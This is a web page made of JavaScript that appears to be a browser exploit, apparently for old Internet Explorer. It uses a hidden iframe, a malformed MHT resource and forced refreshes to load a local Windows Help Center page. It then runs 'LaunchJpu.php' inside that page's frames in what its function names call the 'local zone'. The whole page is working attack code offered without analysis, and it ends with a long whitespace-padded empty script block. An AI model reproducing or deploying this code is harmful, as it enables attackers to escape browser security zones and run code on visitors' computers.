<IFRAME ID=myiframe style="display: none" SRC="about:blank" WIDTH=400 HEIGHT=400></IFRAME>

<SCRIPT>
FramedLocalPage="C:/WINDOWS/PCHEALTH/HELPCTR/System/panels/Context.htm";

base_path="";
IframeHtml_Prefix="<IFRAME WIDTH=300 HEIGHT=300 SRC='";
IframeHtml_Postfix="'></IFRAME>";


//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
function StartToReachLocalZone()
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	{
		//myiframe.frames[0].frames[0].location="LaunchJpu.php";
if (myiframe.document.readyState == "complete")
myiframe.frames[0].frames[0].location="LaunchJpu.php";
else {
setTimeout("ParseLocalFile()",1000);
myiframe.frames[0].frames[0].location="LaunchJpu.php";
}
	}
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
function WaitForLocalFileParsed()
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
//when myiframe status is "complete",
//go to:
//StartToReachLocalZone()
	{
		try{IframeReadyState=myiframe.document.readyState;}catch(e){IframeReadyState="!!ERROR!!";}
		if(IframeReadyState=="complete")
			setTimeout("StartToReachLocalZone()",0);
		else
			setTimeout("WaitForLocalFileParsed()",100);
	}
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
function ParseLocalFile()
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	{
		myiframe.location.href="goback.htm";
//alert(myiframe.document.readyState);
		setTimeout("WaitForLocalFileParsed()",0)	
	}
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
function WaitForLocalFileParser_Step2()
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
//when myiframe status is "complete",
//go to:
//ParseLocalFile()
	{
		try{IframeReadyState=myiframe.document.readyState;}catch(e){IframeReadyState="!!ERROR!!";}
		if(IframeReadyState=="complete")
			setTimeout("ParseLocalFile()",0);
		else
			setTimeout("WaitForLocalFileParser_Step2()",100);

	}
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
function WaitForLocalFileParser()
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
//when myiframe is trying to download the resource from the invalid MHT file,
//go to:
//WaitForLocalFileParser_Step2()
	{
		try{IframeReadyState=myiframe.document.readyState;}catch(e){IframeReadyState="!!ERROR!!";}
		if(IframeReadyState!="!!ERROR!!" && IframeReadyState!="loading")
			{
				myiframe.document.execCommand("Refresh");
setTimeout("ParseLocalFile()",1000);
				setTimeout("WaitForLocalFileParser_Step2()",0);
			}
		else
			setTimeout("WaitForLocalFileParser()",100);
	}

function startRun() {
myiframe.location.href="i.php?LocalUrl="+FramedLocalPage;
setTimeout("WaitForLocalFileParser()",0);
}
</SCRIPT>

<script>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
</script>
